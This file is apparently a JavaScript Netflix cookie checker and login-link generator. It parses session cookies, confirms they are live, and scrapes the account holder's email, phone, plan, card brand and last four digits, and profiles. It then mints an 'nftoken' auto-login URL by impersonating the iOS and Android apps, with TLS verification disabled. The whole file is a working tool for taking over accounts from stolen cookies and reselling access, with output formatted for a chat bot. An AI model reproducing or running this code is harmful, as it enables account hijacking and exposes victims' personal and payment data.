import https from "https";
import axios from "axios";

// ── CONFIG ───────────────────────────────────────────────────────────────────
const API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
const REQUIRED_COOKIE = "NetflixId";

const QUERY_PARAMS = {
  appVersion: "15.48.1",
  config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
  device_type: "NFAPPL-02-",
  esn: "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  idiom: "phone",
  iosVersion: "15.8.5",
  isTablet: "false",
  languages: "en-US",
  locale: "en-US",
  maxDeviceWidth: "375",
  model: "saget",
  modelType: "IPHONE8-1",
  odpAware: "true",
  path: '["account","token","default"]',
  pathFormat: "graph",
  pixelDensity: "2.0",
  progressive: "false",
  responseFormat: "json",
};

const BASE_HEADERS = {
  "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
  "x-netflix.request.attempt": "1",
  "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
  "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
  "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
  "x-netflix.context.app-version": "15.48.1",
  "x-netflix.argo.translated": "true",
  "x-netflix.context.form-factor": "phone",
  "x-netflix.context.sdk-version": "2012.4",
  "x-netflix.client.appversion": "15.48.1",
  "x-netflix.context.max-device-width": "375",
  "x-netflix.context.ab-tests": "",
  "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
  "x-netflix.client.type": "argo",
  "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  "x-netflix.context.locales": "en-US",
  "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
  "x-netflix.client.iosversion": "15.8.5",
  "accept-language": "en-US;q=1",
  "x-netflix.argo.abtests": "",
  "x-netflix.context.os-version": "15.8.5",
  "x-netflix.request.client.context": '{"appState":"foreground"}',
  "x-netflix.context.ui-flavor": "argo",
  "x-netflix.argo.nfnsm": "9",
  "x-netflix.context.pixel-density": "2.0",
  "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
  "x-netflix.request.client.timezoneid": "Asia/Dhaka",
};

// Unique cookie keys used when parsing
const COOKIE_KEYS = [
  "NetflixId",
  "SecureNetflixId",
  "nfvdid",
  "flwssn",
  "profilesNewSession",
];

function decodeCookieValue(value) {
  if (typeof value === "string" && value.includes("%")) {
    try {
      return decodeURIComponent(value);
    } catch {
      return value;
    }
  }
  return value;
}

// ── HELPER: Parse Netscape cookie line ───────────────────────────────────────
function parseNetscapeLine(line) {
  const parts = line.trim().split("\t");
  if (parts.length >= 7) {
    return { [parts[5]]: parts[6] };
  }
  return {};
}

// ── HELPER: Extract cookie dict from any text (txt/json/netscape) ────────────
function extractCookieDict(text) {
  let cookieDict = {};

  for (const rawLine of text.split("\n")) {
    const line = rawLine.trim();
    if (!line || line.startsWith("#")) continue;
    cookieDict = { ...cookieDict, ...parseNetscapeLine(line) };
  }

  try {
    const data = JSON.parse(text);
    if (Array.isArray(data)) {
      for (const cookie of data) {
        const name = cookie.name;
        const value = cookie.value;
        if (COOKIE_KEYS.includes(name) && typeof value === "string") {
          cookieDict[name] = decodeCookieValue(value);
        }
      }
    } else if (typeof data === "object" && data !== null) {
      if (COOKIE_KEYS.some((k) => k in data)) {
        for (const key of COOKIE_KEYS) {
          const value = data[key];
          if (typeof value === "string") {
            cookieDict[key] = decodeCookieValue(value);
          }
        }
      } else if (Array.isArray(data.cookies)) {
        for (const cookie of data.cookies) {
          const name = cookie.name;
          const value = cookie.value;
          if (COOKIE_KEYS.includes(name) && typeof value === "string") {
            cookieDict[name] = decodeCookieValue(value);
          }
        }
      }
    }
  } catch {
    // Not JSON, continue
  }

  for (const key of COOKIE_KEYS) {
    if (key in cookieDict) continue;
    const regex = new RegExp(`(?<!\\w)${key}=([^;,\\s]+)`);
    const match = text.match(regex);
    if (match) {
      cookieDict[key] = decodeCookieValue(match[1]);
    }
  }

  return cookieDict;
}

// ── HELPER: Fetch nftoken from Netflix API + extract account details ─────────
// ── HELPER: Decode JS escaped strings from Netflix HTML ──
function djs(s) {
  if (!s) return "";
  return String(s)
    .replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
    .replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)))
    .trim();
}

// ── HELPER: Regex extract first group ──
function rx(pattern, text, fallback = "") {
  const m = new RegExp(pattern, "s").exec(text || "");
  return m ? m[1] : fallback;
}

// ── HELPER: Regex extract all groups ──
function rxAll(pattern, text) {
  const out = [];
  const re = new RegExp(pattern, "gs");
  let m;
  while ((m = re.exec(text || "")) !== null) out.push(m[1]);
  return out;
}

const COUNTRY_NAMES = {
  US: "United States", IN: "India", ID: "Indonesia", BR: "Brazil", MX: "Mexico",
  GB: "United Kingdom", CA: "Canada", AU: "Australia", DE: "Germany", FR: "France",
  PH: "Philippines", TH: "Thailand", MY: "Malaysia", SG: "Singapore", JP: "Japan",
  KR: "South Korea", TR: "Turkey", SA: "Saudi Arabia", AE: "UAE", EG: "Egypt",
  PK: "Pakistan", BD: "Bangladesh", NG: "Nigeria", ZA: "South Africa", AR: "Argentina",
  CO: "Colombia", CL: "Chile", PE: "Peru", ES: "Spain", IT: "Italy", NL: "Netherlands",
  XX: "Unknown",
};

// ── HELPER: Generate nftoken (iOS API + Android GraphQL fallback) ──
async function generateNfTokenOnly(netflixIdRaw) {
  if (!netflixIdRaw) return null;

  let netflixId = String(netflixIdRaw);
  try { netflixId = decodeURIComponent(netflixId); } catch {}

  // 1) iOS API
  try {
    const headers = { ...BASE_HEADERS, Cookie: `NetflixId=${netflixId}` };
    const response = await axios.get(API_URL, {
      params: QUERY_PARAMS,
      headers,
      timeout: 20000,
      httpsAgent: new https.Agent({ rejectUnauthorized: false }),
    });
    const tokenData =
      (((response.data?.value?.account?.token?.default) || {}));
    if (tokenData?.token) return String(tokenData.token);
  } catch {}

  // 2) Android GraphQL fallback
  try {
    const payload = {
      operationName: "CreateAutoLoginToken",
      variables: { scope: "WEBVIEW_MOBILE_STREAMING" },
      extensions: {
        persistedQuery: {
          version: 102,
          id: "76e97129-f4b5-41a0-a73c-12e674896849",
        },
      },
    };
    const r2 = await axios.post(
      "https://android13.prod.ftl.netflix.com/graphql",
      payload,
      {
        headers: {
          "User-Agent": "Netflix/8.0.0 (Android)",
          Accept: "application/json",
          "Content-Type": "application/json",
          Cookie: `NetflixId=${netflixId}`,
        },
        timeout: 20000,
        httpsAgent: new https.Agent({ rejectUnauthorized: false }),
      }
    );
    const tok = r2.data?.data?.createAutoLoginToken;
    if (tok) return String(tok);
  } catch {}

  return null;
}

// ── HELPER: Scrape Netflix /account page for full details (from checker) ──
async function checkAccount(cookieDict) {
  if (!cookieDict?.NetflixId && !cookieDict?.SecureNetflixId) {
    return null;
  }

  // Build cookie header from all cookies
  const cookieHeader = Object.entries(cookieDict)
    .map(([k, v]) => `${k}=${v}`)
    .join("; ");

  let html = "";
  let finalUrl = "";
  try {
    const r = await axios.get("https://www.netflix.com/account", {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        Cookie: cookieHeader,
        DNT: "1",
      },
      timeout: 25000,
      maxRedirects: 5,
      httpsAgent: new https.Agent({ rejectUnauthorized: false }),
      validateStatus: () => true,
    });
    html = typeof r.data === "string" ? r.data : "";
    finalUrl = r.request?.res?.responseUrl || r.config?.url || "";
    if (r.status === 401 || r.status === 403) return null;
  } catch {
    return null;
  }

  if (String(finalUrl).toLowerCase().includes("login")) return null;
  if (!html.includes('"membershipStatus":"CURRENT_MEMBER"')) return null;

  const email = djs(rx('"emailAddress":"([^"]+)"', html));

  let name = djs(rx('"userInfo":\\{"name":"([^"]+)"', html));
  if (!name) name = djs(rx('"firstName":"([^"]+)"', html));

  const cc = rx('"countryOfSignup":"([A-Z]{2,3})"', html, "XX");

  let since = djs(rx('"memberSince":"([^"]+)"', html));
  if (!since) {
    const tsRaw = rx('"memberSince":\\{"fieldType":"Numeric","value":(\\d+)\\}', html);
    if (tsRaw && /^\d+$/.test(tsRaw)) {
      try {
        since = new Date(parseInt(tsRaw, 10)).toLocaleString("en-US", {
          month: "long",
          year: "numeric",
          timeZone: "UTC",
        });
      } catch {
        since = "N/A";
      }
    }
  }

  const plan = djs(
    rx('"localizedPlanName":\\{"fieldType":"String","value":"([^"]+)"\\}', html)
  );
  const planId = rx('"planId":\\{"fieldType":"String","value":"([^"]+)"\\}', html);
  const price = djs(
    rx('"planPrice":\\{"fieldType":"String","value":"([^"]+)"\\}', html)
  );

  const qRaw = rx(
    '"videoQuality":\\{"fieldType":"String","value":"([^"]+)"\\}',
    html
  ).toUpperCase();
  const qualityMap = {
    UHD: "UHD 4K",
    FHD: "FHD 1080p",
    HD: "HD 720p",
    SD: "SD 480p",
  };
  const quality = qualityMap[qRaw] || qRaw || "N/A";

  const streams = rx(
    '"maxStreams":\\{"fieldType":"Numeric","value":(\\d+)\\}',
    html,
    "N/A"
  );
  const nextbill = djs(
    rx('"nextBillingDate":\\{"fieldType":"String","value":"([^"]+)"\\}', html)
  );

  const pmStart = html.indexOf('"paymentMethods"');
  const pmRaw = pmStart >= 0 ? html.slice(pmStart, pmStart + 3000) : "";
  let cardBrand = rx('"paymentOptionLogo":"([^"]+)"', pmRaw);
  if (!cardBrand) {
    cardBrand = rx('"type":\\{"fieldType":"String","value":"([^"]+)"\\}', pmRaw);
  }
  const payType = rx(
    '"paymentMethod":\\{"fieldType":"String","value":"([^"]+)"\\}',
    pmRaw
  );
  let cardLast4 = rx(
    '"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"',
    pmRaw
  );
  if (!cardLast4) {
    cardLast4 = rx(
      '"displayText":\\{"fieldType":"String","value":"([^"]+)"\\}',
      pmRaw
    );
  }

  const phone = djs(rx('"phoneNumber":"([^"]*)"', html)) || "N/A";
  const pvRaw = rx(
    '"isPhoneVerified":(?:\\{"fieldType":"Boolean","value":)?(true|false)',
    html
  );
  const phoneVerified = pvRaw === "true";

  const extraRaw = rx(
    '"extraMemberSlots":\\{"fieldType":"Numeric","value":(\\d+)\\}',
    html,
    "0"
  );
  const extraSlots = /^\d+$/.test(extraRaw) ? parseInt(extraRaw, 10) : 0;
  const canChange = html.includes(
    '"canChangePlan":{"fieldType":"Boolean","value":true}'
  );
  const freeTrial = html.includes('"isInFreeTrial":true');

  let profiles = rxAll('"profileName":"([^"]+)"', html).map(djs);
  if (!profiles.length) {
    profiles = rxAll(
      '"profileName":\\{"fieldType":"String","value":"([^"]+)"\\}',
      html
    ).map(djs);
  }
  const seen = new Set();
  const profilesClean = [];
  for (const p of profiles) {
    if (p && !seen.has(p)) {
      seen.add(p);
      profilesClean.push(p);
    }
  }

  const userGuid = rx('"userGuid":"([^"]+)"', html);
  const displayName = name || (profilesClean[0] || "N/A");

  return {
    email: email || "N/A",
    profileName: displayName,
    name: displayName,
    country: COUNTRY_NAMES[cc] || cc || "Unknown",
    countryCode: cc || "XX",
    plan: plan || "N/A",
    planId: planId || "N/A",
    price: price || "N/A",
    priceFormatted: price || "N/A",
    memberSince: since || "N/A",
    nextBill: nextbill || "N/A",
    freeTrial,
    canChange,
    maxResolution: quality,
    maxDevices: String(streams),
    extraSlots,
    cardBrand: cardBrand || "N/A",
    cardLast4: cardLast4 || "N/A",
    paymentMethod: payType || "N/A",
    phone,
    phoneVerified,
    profiles: profilesClean,
    profileCount: profilesClean.length,
    userGuid: userGuid || "N/A",
    status: "Active",
    isCancelled: false,
  };
}

// ── HELPER: Fetch nftoken + full account details ──
async function fetchNfToken(cookieDict) {
  const netflixId = cookieDict[REQUIRED_COOKIE] || cookieDict.NetflixId;
  if (!netflixId) {
    throw new Error("Missing required cookie: NetflixId");
  }

  // 1) Validate + scrape account details from /account page
  const details = await checkAccount(cookieDict);
  if (!details) {
    throw new Error("Expired or invalid cookie — account page check failed");
  }

  // 2) Generate login token
  const token = await generateNfTokenOnly(netflixId);
  if (!token) {
    throw new Error("Expired or invalid cookie — no token returned");
  }

  return {
    token,
    expires: null,
    details,
  };
}

// ── HELPER: Format account details into readable text ──
function formatAccountDetails(details) {
  if (!details) return "ℹ️ No account details available\n";
  let text = "";
  if (details.email && details.email !== "N/A") text += `📧 *Email:* ${details.email}\n`;
  if (details.profileName && details.profileName !== "N/A") text += `👤 *Profile:* ${details.profileName}\n`;
  if (details.plan && details.plan !== "N/A") text += `📦 *Plan:* ${details.plan}\n`;
  if (details.status && details.status !== "N/A") text += `✅ *Status:* ${details.status}\n`;
  if (details.priceFormatted && details.priceFormatted !== "N/A") text += `💰 *Price:* ${details.priceFormatted}\n`;
  if (details.nextBill && details.nextBill !== "N/A") text += `📅 *Next Bill:* ${details.nextBill}\n`;
  if (details.memberSince && details.memberSince !== "N/A") text += `📆 *Member Since:* ${details.memberSince}\n`;
  if (details.country && details.country !== "N/A") text += `🌍 *Country:* ${details.country}\n`;
  if (details.maxDevices && details.maxDevices !== "N/A") text += `📱 *Max Streams:* ${details.maxDevices}\n`;
  if (details.maxResolution && details.maxResolution !== "N/A") text += `🖥️ *Max Quality:* ${details.maxResolution}\n`;
  if (details.paymentMethod && details.paymentMethod !== "N/A") text += `💳 *Payment:* ${details.paymentMethod}\n`;
  if (details.cardBrand && details.cardBrand !== "N/A") text += `💳 *Card:* ${details.cardBrand} ${details.cardLast4 && details.cardLast4 !== "N/A" ? details.cardLast4 : ""}\n`;
  if (details.phone && details.phone !== "N/A") text += `📞 *Phone:* ${details.phone}${details.phoneVerified ? " ✅" : ""}\n`;
  if (details.profiles && details.profiles.length) text += `👥 *Profiles:* ${details.profiles.join(", ")}\n`;
  if (details.extraSlots) text += `➕ *Extra Slots:* ${details.extraSlots}\n`;
  if (details.freeTrial) text += `🎁 *Free Trial:* Yes\n`;
  return text || "ℹ️ No account details available\n";
}

// ── HELPER: Format expiry timestamp ──────────────────────────────────────────
function formatExpiry(expires) {
  if (typeof expires !== "number") return "Unknown";
  try {
    return new Date(expires * 1000).toLocaleString("en-US", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      timeZone: "Asia/Kolkata",
    });
  } catch {
    return String(expires);
  }
}


/**
 * Accept raw cookie text (netscape / json / key=value) and generate a login link.
 */
export async function generateFromCookieText(cookieText) {
  const cookieDict = extractCookieDict(String(cookieText || ""));
  if (!cookieDict || (!cookieDict.NetflixId && !cookieDict.SecureNetflixId)) {
    throw new Error("No valid Netflix cookies found. Need NetflixId (and ideally SecureNetflixId).");
  }

  const { token, expires, details } = await fetchNfToken(cookieDict);
  const loginUrl = `https://netflix.com/?nftoken=${encodeURIComponent(token)}`;
  const expiryStr = formatExpiry(expires);

  return {
    ok: true,
    token,
    loginUrl,
    expiryStr,
    expires,
    details: details || null,
    detailsText: formatAccountDetails(details || {}),
  };
}

/**
 * Only scrape / validate account — no token generation.
 */
export async function checkFromCookieText(cookieText) {
  const cookieDict = extractCookieDict(String(cookieText || ""));
  if (!cookieDict || (!cookieDict.NetflixId && !cookieDict.SecureNetflixId)) {
    throw new Error("No valid Netflix cookies found. Need NetflixId (and ideally SecureNetflixId).");
  }
  const details = await checkAccount(cookieDict);
  if (!details) {
    throw new Error("Expired or invalid cookie — account page check failed");
  }
  return {
    ok: true,
    details,
    detailsText: formatAccountDetails(details),
  };
}

export {
  extractCookieDict,
  checkAccount,
  generateNfTokenOnly,
  fetchNfToken,
  formatAccountDetails,
  formatExpiry,
};
